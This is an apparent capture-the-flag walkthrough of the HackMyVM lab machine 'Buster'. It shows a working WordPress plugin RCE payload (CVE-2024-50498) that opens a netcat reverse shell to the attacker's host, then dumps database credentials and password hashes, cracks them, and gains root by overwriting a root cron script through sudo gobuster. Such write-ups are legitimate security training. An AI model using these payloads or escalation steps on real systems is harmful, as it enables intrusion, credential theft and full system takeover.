# Buster

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.66:22
Open 10.0.2.66:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.66

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfYzBJQsUZrqSGhBjydbjtAuxvwq/5PTn9cKOuRU3cX0PvqfV4TOIdbAhysBsQfoAezIuKQSky/KbmLZCdAxzLWvNROwtHdyVIUI4PmMWpqVeO/AxPFgKzlLcW1q/CSWAtyUdNUbFGTxidKlBduWppBufd74VupdA/aOTeqH8JWHCvJjfjRBvKohMR0oAM21ezNDSw1FrJ9pxpv90gPyqTX/9TA5J0XopnsDFMbzjTj0/aEiFrTmIOWvq9IlkEoIaSPq+raInzbhy3UTzJmAxl0bb0yM3+uWeu3IEp+i9+cGxtf5vgNwiRkdAI3Ki6QHjrSHsFQ1m7o/fV83e/BZlX
|   256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKCfpcXOvl2zgP5HXJMxdKvTg3lsZ50vTDc76l1MehwnvWf1y7XsyAtheRg4heZYt63CxxBs6Bsf1PdEbRSF4tE=
|   256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILxmQFkVzRqAQH1sdqxSGaIS5QDjKFKCSgpZhE9I5qWO
80/tcp open  http    syn-ack nginx 1.14.2
|_http-generator: WordPress 6.7.1
|_http-title: bammmmuwe
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: nginx/1.14.2
|_http-favicon: Unknown favicon MD5: E76821860677A2F64906D68E5E417D88
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::


## HTTP

![writeup.png](/assets/pentest/hackmyvm/buster/writeup.png)

### CVE-2024-50498

```bash
└─$ nuclei -u http://10.0.2.66
...
[CVE-2024-50498] [http] [critical] http://10.0.2.66/index.php?rest_route=/wqc/v1/query
...
```

- [CVE-2024-50498](https://cvefeed.io/vuln/detail/CVE-2024-50498): WordPress WP Query Console plugin <= 1.0 - Remote Code Execution (RCE) vulnerability
- [CVE-2024-50498](https://github.com/p0et08/CVE-2024-50498/tree/main) POC

```bash
└─$ curl 'http://10.0.2.66/index.php?rest_route=/wqc/v1/query' -d 'queryType=WP_Query&queryArgs=phpinfo();' > index.php
```

![writeup-1.png](/assets/pentest/hackmyvm/buster/writeup-1.png)

::: info Note
CVE doesn't have any output, but command is executed.
:::

## Reverse Shell (www-data)

```bash
└─$ curl 'http://10.0.2.66/index.php?rest_route=/wqc/v1/query' -d 'queryType=post&queryArgs=shell_exec("busybox nc 10.0.2.15 4444 -e /bin/bash");'
---
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.66] 34132
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@listen:~/html/wordpress$ ^Z
zsh: suspended  nc -lvnp 4444

└─$ stty raw -echo;fg;
[1]  + continued  nc -lvnp 4444

www-data@listen:~/html/wordpress$ stty rows 47 cols 211;export TERM=xterm
www-data@listen:~/html/wordpress$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
www-data@listen:~/html/wordpress$ cat wp-config.php | grep define
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'll104567' );
define( 'DB_PASSWORD', 'thehandsomeguy' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8mb4' );
define( 'DB_COLLATE', '' );
define( 'AUTH_KEY',         '2Ryf <:T/-4,9h?q%jDi(HKG_*1xH-nU+-//7[1H}zD@=q0ls8junY(~.MG@D[$S' );
define( 'SECURE_AUTH_KEY',  '}z]MVJ|P5~X1!+76?dT?s|@A,92D4/+phWkWb=;I+k{_y)7,A,<=5|&z<tE:`HET' );
define( 'LOGGED_IN_KEY',    'p4w9>FcR>{+u:M,M4rT}VIW.[Pg=UZjzp8n{-/&F;j!nC49f-^~$unsry+lHW w!' );
define( 'NONCE_KEY',        ';qi?~eGux58*l4NoDh@?<`^B6!HK{G:C85Hv8sC6<t,y}8veV4pvs#{ [[T?s123' );
define( 'AUTH_SALT',        'l2^yBli3l_G#J<T 2p}e#bS>j_=,!06$%qYd#I<p22c:z&`s?ic;7UxS$T6c{HXr' );
define( 'SECURE_AUTH_SALT', '<;95CFam*#)^qbL)a,KZXrqS$!]Ln^2yF2wg#Fa?9F<D)-,irw&nj/$pB)BR1u|O' );
define( 'LOGGED_IN_SALT',   'JaR6i0q<wZMJD-7HwE:7ZwtNxV$BJ%15=8~Bw(_jCL_`+<`^asIdv=$Yo81jE19K' );
define( 'NONCE_SALT',       'q!5K2-Q*^%Tf<lz)*o0&8/CCjU;8-jdLS4,*5vk/8,^j&]<S7+I&eO55C_CM6N@L' );
define( 'WP_DEBUG', false );
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
```

```bash
www-data@listen:~/html/wordpress$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
welcome:x:1001:1001::/home/welcome:/bin/sh
```

Nope
```bash
└─$ sshpass -p 'thehandsomeguy' ssh welcome@10.0.2.66
Warning: Permanently added '10.0.2.66' (ED25519) to the list of known hosts.
Permission denied, please try again.
```

### MySQL

```bash
www-data@listen:~/html/wordpress$ mysql -u'll104567' -p'thehandsomeguy' wordpress -e 'SELECT CONCAT(user_login,":",user_pass) FROM wp_users' -Ns
ta0:$P$BDDc71nM67DbOVN/U50WFGII6EF6.r.
welcome:$P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/
```

```powershell
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
104567           (welcome)
```

## SSH

```bash
└─$ sshpass -p '104567' ssh welcome@10.0.2.66 -t bash
welcome@listen:~$ id
uid=1001(welcome) gid=1001(welcome) groups=1001(welcome)
```

### User.txt

```
welcome@listen:~$ cat user.txt
29e0f786e8c90b3ce82e00de0ec7e7d3
```

## Privilege Escalation

```
welcome@listen:~$ sudo -l
Matching Defaults entries for welcome on listen:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on listen:
    (ALL) NOPASSWD: /usr/bin/gobuster
```

Hmmm probably not cracking it anytime soon
```bash
welcome@listen:~$ sudo gobuster -u http://127.0.0.1 -w /etc/shadow -v
Missed: /root:$6$uvmZZfH41v4CKcWZ$kAglkiLVm6RQYjB/9wZ8GgmbJQqT8QZazoC7hz27tArTJkp7wQZ..0jAnw3BEge9aeN6614uoDeRn5aHvVqc10:20096:0:99999:7::: (Status: 404)
Missed: /welcome:$6$HIgYZML9csiJa8hB$BBiAuJ2hiMS8fhdLxy/w9Ixa4mS3Kp9lqquX6gC5is333AIWmT1.XMUjFskgjFDYINRKVTQMe/5z/aTYD9MYw1:20096:0:99999:7::: (Status: 404)
```

```bash
└─$ sshpass -p '104567' scp /opt/scripts/enum/pspy64 welcome@10.0.2.66:/tmp/pspy
welcome@listen:~$ chmod +x /tmp/pspy
welcome@listen:~$ /tmp/pspy
...
2025/09/30 16:17:01 CMD: UID=0     PID=1455   | /usr/sbin/CRON -f
2025/09/30 16:17:01 CMD: UID=0     PID=1456   | /bin/sh -c /bin/bash /opt/.test.sh
2025/09/30 16:17:01 CMD: UID=0     PID=1457   | /bin/sh -c    cd / && run-parts --report /etc/cron.hourly
...
```

We can't write to `/opt`, but `gobuster` can.

```bash
welcome@listen:~$ echo 'tmp/letmein' > test.txt
---
└─$ mkdir tmp
└─$ touch tmp/letmein
└─$ pm -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
---
welcome@listen:~$ echo $'#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod 4777 /tmp/rootbash' | tee /tmp/letmein
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4777 /tmp/rootbash

welcome@listen:~$ chmod +x /tmp/letmein

welcome@listen:~$ sudo gobuster -u http://10.0.2.15 -w test.txt -o /opt/.test.sh -n -np -q
/tmp/letmein

welcome@listen:~$ sleep 60

welcome@listen:/tmp$ /tmp/rootbash -p
rootbash-5.0# id
uid=1001(welcome) gid=1001(welcome) euid=0(root) groups=1001(welcome)
```

### Root.txt

```bash
rootbash-5.0# cat /root/R00t_fl4g_is_HHHHerererererrererere.txt
b6a1a0de4223ba038327fc9c647701fb
```

## P.S.

```bash
rootbash-5.0# cat /root/note.txt
Congratulation,you make it.
If you want to learn network security technology,
you can join our exchange group
QQ 660930334
if you know what is QQ.
```